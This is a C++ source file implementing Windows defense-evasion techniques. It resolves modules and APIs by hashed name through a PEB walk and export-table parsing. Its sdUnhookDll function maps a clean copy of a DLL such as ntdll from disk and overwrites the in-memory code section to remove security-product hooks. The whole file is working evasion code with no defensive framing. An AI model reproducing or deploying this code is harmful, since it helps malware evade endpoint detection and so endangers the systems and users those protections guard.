#include "../include/Peb.h"
#include <iostream>

PUNICODE_STRING _sdGetModuleName(ULONG Hash, PLIST_ENTRY StartListEntry, PLIST_ENTRY ListEntry) {
	if (StartListEntry == NULL && ListEntry == NULL) {
		PPEB_LDR_DATA Ldr = ((PPEB)__readgsqword(0x60))->Ldr;
		StartListEntry = &Ldr->InMemoryOrderModuleList;
		ListEntry = StartListEntry->Flink;
	}

	if (ListEntry == StartListEntry) {
		return nullptr;
	}

	PLDR_DATA_TABLE_ENTRY pEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)ListEntry - sizeof(LIST_ENTRY));
	if (sdFowlerW((LPCWSTR)pEntry->BaseDllName.Buffer) == Hash) {
		return (PUNICODE_STRING)&pEntry->FullDllName;
	}

	return _sdGetModuleName(Hash, StartListEntry, ListEntry->Flink);
}

PUNICODE_STRING sdGetModuleName(ULONG Hash) {
	return _sdGetModuleName(Hash, NULL, NULL);
}

PVOID _sdGetModuleHandle(ULONG Hash, PLIST_ENTRY StartListEntry, PLIST_ENTRY ListEntry) {
	if (StartListEntry == NULL && ListEntry == NULL) {
		PPEB_LDR_DATA Ldr = ((PPEB)__readgsqword(0x60))->Ldr;
		StartListEntry = &Ldr->InMemoryOrderModuleList;
		ListEntry = StartListEntry->Flink;
	}

	if (ListEntry == StartListEntry) {
		return NULL;
	}

	PLDR_DATA_TABLE_ENTRY pEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)ListEntry - sizeof(LIST_ENTRY));
	if (sdFowlerW((LPCWSTR)pEntry->BaseDllName.Buffer) == Hash) {
		return (PVOID)pEntry->DllBase;
	}

	return _sdGetModuleHandle(Hash, StartListEntry, ListEntry->Flink);
}

PVOID sdGetModuleHandle(ULONG Hash) {
	return _sdGetModuleHandle(Hash, NULL, NULL);
}

DWORD64 _sdGetProcAddress(PVOID Module, ULONG Hash, ULONG Index) {
	PIMAGE_NT_HEADERS Nth = (PIMAGE_NT_HEADERS)((BYTE*)Module + ((PIMAGE_DOS_HEADER)Module)->e_lfanew);
	PIMAGE_DATA_DIRECTORY Dir = &Nth->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
	PIMAGE_EXPORT_DIRECTORY Exp = (PIMAGE_EXPORT_DIRECTORY)((ULONG_PTR)Module + Dir->VirtualAddress);
	if (!Dir->VirtualAddress || Index >= Exp->NumberOfNames) {
		return 0;
	}

	PUINT16 Aoo = (PUINT16)((ULONG_PTR)Module + Exp->AddressOfNameOrdinals);
	PUINT32 Aof = (PUINT32)((ULONG_PTR)Module + Exp->AddressOfFunctions);
	PUINT32 Aon = (PUINT32)((ULONG_PTR)Module + Exp->AddressOfNames);

	if (sdFowlerA((LPCSTR)((ULONG_PTR)Module + Aon[Index])) == Hash) {
		return (DWORD64)((ULONG_PTR)Module + Aof[Aoo[Index]]);
	}

	return _sdGetProcAddress(Module, Hash, Index + 1);
}

DWORD64 sdGetProcAddress(PVOID Module, ULONG Hash) {
	return _sdGetProcAddress(Module, Hash, 0);
}

VOID sdGetUnhookApi(UnhookApi* API, PVOID hNtdll) {
	API->NtProtectVirtualMemory = (fn_NtProtectVirtualMemory)sdGetProcAddress(hNtdll, NT_VIRTUAL_PROTECT);
	API->NtCreateFile = (fn_NtCreateFile)sdGetProcAddress(hNtdll, NT_CREATE_FILE);
	API->NtCreateSection = (fn_NtCreateSection)sdGetProcAddress(hNtdll, NT_CREATE_SECTION);
	API->NtMapViewOfSection = (fn_NtMapViewOfSection)sdGetProcAddress(hNtdll, NT_MAP_SECTION_VIEW);
	API->NtUnmapViewOfSection = (fn_NtUnmapViewOfSection)sdGetProcAddress(hNtdll, NT_UNMAP_SECTION_VIEW);
	API->NtClose = (fn_NtClose)sdGetProcAddress(hNtdll, NT_CLOSE);
}

BOOL sdUnhookDll(ULONG Hash, PVOID ModuleBase) {
	// PE STUFF
	PIMAGE_DOS_HEADER Dos = (PIMAGE_DOS_HEADER)(ModuleBase);
	PIMAGE_NT_HEADERS NtH = (PIMAGE_NT_HEADERS)((DWORD_PTR)ModuleBase + Dos->e_lfanew);
	PIMAGE_SECTION_HEADER SctH = IMAGE_FIRST_SECTION(NtH);
	// NTAPI STUFF
	SIZE_T szSizeText = 0;
	DWORD dwOldProtect = 0;
	LPVOID pText = nullptr;
	HANDLE hFile = nullptr;
	HANDLE hSection = nullptr;
	PVOID pMapping = nullptr;
	OBJECT_ATTRIBUTES oa{};
	IO_STATUS_BLOCK ioStatus;
	SIZE_T viewSize = 0;
	// STRING STUFF
	PUNICODE_STRING ModuleName = nullptr;
	UNICODE_STRING prefixPath = {};
	WCHAR fullPathBuffer[MAX_PATH] = {};
	CONST WCHAR* prefix = L"\\??\\";
	SIZE_T szPrefix = 0;
	SIZE_T szPath = 0;
	// NTAPI RESOLUTION
	PVOID hNtdll = nullptr;
	UnhookApi API{};
	NTSTATUS status = 0;

	hNtdll = sdGetModuleHandle(NTDLL);
	sdGetUnhookApi(&API, hNtdll);

	ModuleName = sdGetModuleName(Hash);
	szPrefix = sdStringLengthW(prefix);
	szPath = sdStringLengthW(ModuleName->Buffer);
	if ((szPrefix + szPath) >= MAX_PATH) {
		return false;
	}

	sdStringCopyW(fullPathBuffer, prefix);
	sdStringConcatW(fullPathBuffer, ModuleName->Buffer);

	sdRtlInitUnicodeString(&prefixPath, fullPathBuffer);

	InitializeObjectAttributes(&oa, &prefixPath, OBJ_CASE_INSENSITIVE, NULL, NULL);
	
	status = API.NtCreateFile(&hFile, GENERIC_READ, &oa, &ioStatus, 0, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OPEN, FILE_NON_DIRECTORY_FILE, 0, 0);
	if (status != STATUS_SUCCESS) {
		return false;
	}

	status = API.NtCreateSection(&hSection, SECTION_MAP_READ, NULL, NULL, PAGE_READONLY, SEC_COMMIT, hFile);
	if (status != STATUS_SUCCESS) {
		return false;
	}

	status = API.NtMapViewOfSection(hSection, ((HANDLE)-1), &pMapping, 0, 0, NULL, &viewSize, ViewShare, 0, PAGE_READONLY);
	if (status != STATUS_SUCCESS) {
		return false;
	}

	pText = sdFindText(&szSizeText, SctH, ModuleBase);
	
	szSizeText = SctH->Misc.VirtualSize;
	status = API.NtProtectVirtualMemory(((HANDLE)-1), &pText, &szSizeText, PAGE_EXECUTE_READWRITE, &dwOldProtect);
	if (status != STATUS_SUCCESS) {
		return false;
	}
	
	__builtin_memcpy(
		(LPVOID)((DWORD_PTR)ModuleBase + (DWORD_PTR)SctH->VirtualAddress),
		(LPVOID)((DWORD_PTR)pMapping + (DWORD_PTR)SctH->VirtualAddress),
		szSizeText
	);

	status = API.NtProtectVirtualMemory(((HANDLE)-1), &pText, &szSizeText, dwOldProtect, &dwOldProtect);
	if (status != STATUS_SUCCESS) {
		return false;
	}

	status = API.NtUnmapViewOfSection(((HANDLE)-1), pMapping);
	if (status != STATUS_SUCCESS) {
		return false;
	}
	status = API.NtClose(hFile);
	if (status != STATUS_SUCCESS) {
		return false;
	}
	status = API.NtClose(hSection);
	if (status != STATUS_SUCCESS) {
		return false;
	}
	return true;
}